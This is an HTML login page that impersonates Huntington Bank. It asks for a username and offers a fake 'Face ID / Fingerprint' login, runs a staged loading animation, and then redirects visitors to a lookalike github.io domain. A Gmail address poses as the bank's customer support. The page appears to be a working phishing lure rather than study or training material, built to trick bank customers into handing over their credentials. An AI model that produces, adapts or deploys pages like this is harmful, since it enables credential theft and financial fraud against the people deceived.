<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Huntington Bank - Secure Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root {
      --text-color: #000;
      --button-bg: #2d822a;
      --button-hover: #24691e;
      --link-color: #2d822a;
      --loading-bg: rgba(245,245,245,0.96);
      --loading-text-color: #222;
      --heading-bg: url('IMG_0564.jpeg');
    }

    [data-theme='dark'] {
      --text-color: #fff;
      --button-bg: #3aa850;
      --button-hover: #2a8040;
      --link-color: #5ecc6c;
      --loading-bg: rgba(30,30,30,0.96);
      --loading-text-color: #fff;
      --heading-bg: url('IMG_0564.jpeg');
    }

    body {
      font-family: sans-serif;
      text-align: center;
      padding: 0;
      margin: 0;
      min-height: 100vh;
      color: var(--text-color);
      background: var(--loading-bg);
      transition: background 0.3s, color 0.3s;
      position: relative;
      z-index: 1;
    }

    .theme-switch {
      position: absolute;
      top: 20px;
      right: 20px;
      z-index: 3;
    }

    .theme-switch label {
      font-size: 14px;
      cursor: pointer;
    }

    .header-section {
      background: var(--heading-bg) center center/cover no-repeat;
      min-height: 210px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      position: relative;
    }

    .logo {
      margin-bottom: 10px;
      z-index: 2;
      position: relative;
    }

    .logo img {
      width: 110px;
      height: auto;
      display: block;
      margin: 0 auto;
      background: none;
      border: none;
      box-shadow: none;
      border-radius: 0;
      padding: 0;
    }

    h1 {
      color: #fff;
      font-size: 24px;
      margin: 5px 0 0 0;
      font-weight: bold;
      text-shadow: 0 2px 8px rgba(0,0,0,0.28);
    }

    .main-content {
      padding: 30px 15px 0 15px;
      max-width: 360px;
      margin: 0 auto;
    }

    p {
      font-size: 16px;
      margin-bottom: 30px;
      color: var(--text-color);
    }

    .input-group {
      margin-bottom: 20px;
    }

    input[type="text"] {
      width: 250px;
      padding: 12px 10px;
      font-size: 16px;
      border: 1px solid #bbb;
      border-radius: 5px;
      margin-bottom: 10px;
      box-sizing: border-box;
      background: rgba(255,255,255,0.84);
      color: var(--text-color);
      transition: border-color 0.2s, background 0.3s, color 0.3s;
    }
    [data-theme='dark'] input[type="text"] {
      background: rgba(30,30,30,0.84);
      color: #fff;
      border-color: #444;
    }
    input[type="text"]:focus {
      outline: none;
      border-color: var(--button-bg);
    }

    button {
      padding: 15px 25px;
      font-size: 18px;
      background-color: var(--button-bg);
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-bottom: 10px;
      transition: background 0.2s;
    }

    button:disabled {
      background: #c3c3c3;
      cursor: not-allowed;
    }

    button:hover:not(:disabled) {
      background-color: var(--button-hover);
    }

    .contact {
      margin-top: 40px;
      font-size: 16px;
      color: var(--text-color);
    }

    a {
      color: var(--link-color);
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    /* Loading overlay styles */
    .loading-overlay {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100vw;
      height: 100vh;
      background: var(--loading-bg);
      color: var(--loading-text-color);
      align-items: center;
      justify-content: center;
      flex-direction: column;
      text-align: center;
      font-size: 1.3rem;
      font-weight: 500;
    }

    .loading-overlay.visible {
      display: flex;
      animation: fadeIn 0.3s;
    }

    @keyframes fadeIn {
      from {opacity: 0;}
      to {opacity: 1;}
    }

    .loader-bar {
      margin: 28px auto 0;
      width: 160px;
      height: 8px;
      background: #eee;
      border-radius: 4px;
      overflow: hidden;
      position: relative;
    }
    .loader-bar-progress {
      height: 100%;
      width: 0;
      background: linear-gradient(90deg, #2d822a 40%, #5ecc6c 80%);
      border-radius: 4px;
      transition: width 0.2s;
    }

  </style>
</head>
<body>

  <div class="theme-switch">
    <label>
      <input type="checkbox" id="themeToggle"> Dark Mode
    </label>
  </div>

  <div class="header-section">
    <div class="logo">
      <img src="IMG_0561.png" alt="Huntington Bank Logo">
    </div>
    <h1>Welcome to Huntington Bank</h1>
  </div>

  <div class="main-content">
    <p>Secure biometric authentication is required to proceed.</p>

    <div class="input-group">
      <input type="text" id="usernameInput" placeholder="Enter your username" autocomplete="username">
    </div>

    <button id="loginButton" onclick="biometricLogin()" disabled>Login with Face ID / Fingerprint</button>

    <div class="contact">
      <h3>Need Help?</h3>
      <p><a href="mailto:huntington.services.help@gmail.com">Contact Customer Support</a></p>
    </div>
  </div>

  <!-- Loading animation overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div>
      <div style="font-size:1.7rem;margin-bottom:20px;">
        LOADING<br>
        <span style="color:#2d822a;">HUNTINGTON BANK IS PROCESSING YOUR REQUEST</span>
      </div>
      <div>YOU'LL BE GIVEN ACCESS SHORTLY</div>
      <div class="loader-bar">
        <div class="loader-bar-progress" id="loaderBarProgress"></div>
      </div>
    </div>
  </div>

  <script>
    // Enable login button only if username is entered
    const usernameInput = document.getElementById('usernameInput');
    const loginButton = document.getElementById('loginButton');
    usernameInput.addEventListener('input', function() {
      loginButton.disabled = this.value.trim().length === 0;
    });

    function biometricLogin() {
      const username = usernameInput.value.trim();
      if (!username) return;

      // Show loading overlay and animate
      const overlay = document.getElementById('loadingOverlay');
      const progress = document.getElementById('loaderBarProgress');
      overlay.classList.add('visible');
      let percent = 0;
      progress.style.width = '0%';

      // Animate progress bar for 4 seconds
      const interval = setInterval(() => {
        percent += 2.5;
        progress.style.width = percent + '%';
        if (percent >= 100) {
          clearInterval(interval);
        }
      }, 100);

      // Redirect after 4 seconds
      setTimeout(() => {
        window.location.href = "https://huntington-safe-login.github.io/My-Huntington.account/";
      }, 4000);
    }

    const toggle = document.getElementById('themeToggle');
    toggle.addEventListener('change', function() {
      document.documentElement.setAttribute('data-theme', this.checked ? 'dark' : 'light');
    });

    // Initialize to light mode
    document.documentElement.setAttribute('data-theme', 'light');
  </script>

</body>
</html>
